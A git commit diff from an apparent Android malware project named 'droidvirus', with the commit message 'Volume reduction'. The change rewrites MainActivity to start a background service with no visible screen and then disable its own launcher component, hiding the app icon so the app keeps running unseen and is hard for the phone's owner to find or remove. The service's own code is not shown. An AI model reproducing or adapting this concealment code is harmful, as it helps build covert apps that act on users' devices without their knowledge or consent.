0b8cdbced76b8610b8639646db58b559d12bc1f7
Artisanter <chyzhyk99@gmail.com>
2019-12-10 07:13:07 +0300

    Volume reduction

--- app/src/main/java/com/artisanter/droidvirus/MainActivity.java
+++ app/src/main/java/com/artisanter/droidvirus/MainActivity.java
@@ -1,14 +1,25 @@
 package com.artisanter.droidvirus;
 
-import androidx.appcompat.app.AppCompatActivity;
-
+import android.app.Activity;
+import android.content.ComponentName;
+import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 
-public class MainActivity extends AppCompatActivity {
+public class MainActivity extends Activity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
+
+        startService(new Intent(this, MainService.class));
+
+        ComponentName cn = new ComponentName(
+                "com.artisanter.droidvirus",
+                "com.artisanter.droidvirus.MainActivity");
+        getPackageManager()
+        .setComponentEnabledSetting(cn,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
     }
 }
